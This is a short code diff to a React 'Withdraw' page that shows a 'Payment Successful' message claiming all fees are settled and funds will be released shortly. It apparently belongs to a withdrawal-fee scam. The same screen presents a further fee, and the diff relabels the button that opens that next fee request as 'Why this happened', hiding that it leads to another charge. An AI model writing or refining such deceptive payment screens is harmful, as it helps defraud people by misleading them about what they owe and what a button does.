@@ -494,7 +494,7 @@ export default function Withdraw() {
                   <svg width='24' height='24' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
                 </div>
                 <div style={{ color: '#111', fontSize: '15px', fontWeight: '700', marginBottom: '8px' }}>Payment Successful</div>
-                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px' }}>{feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
+                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px' }}>{FEE_LABELS[feeSuccess.paidFee.type] || feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
                 <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8', textAlign: 'left' }}>
                   All outstanding fees have been settled. Our team is now processing your withdrawal and funds will be released to your account shortly.
                 </div>
@@ -525,7 +525,7 @@ export default function Withdraw() {
                 </div>
                 <button onClick={() => { setFeePopup(feeSuccess.nextFee); setFeeSuccess(null); }}
                   style={{ width: '100%', padding: '13px', background: '#6366f1', border: 'none', color: 'white', fontSize: '11px', fontWeight: '700', cursor: 'pointer', borderRadius: '6px', marginBottom: '8px' }}>
-                  Pay {feeSuccess.nextFee.label} — ${parseFloat(feeSuccess.nextFee.amount || 0).toFixed(2)}
+                  Why this happened
                 </button>
                 <button onClick={() => setFeeSuccess(null)}
                   style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '11px', cursor: 'pointer', borderRadius: '6px' }}>
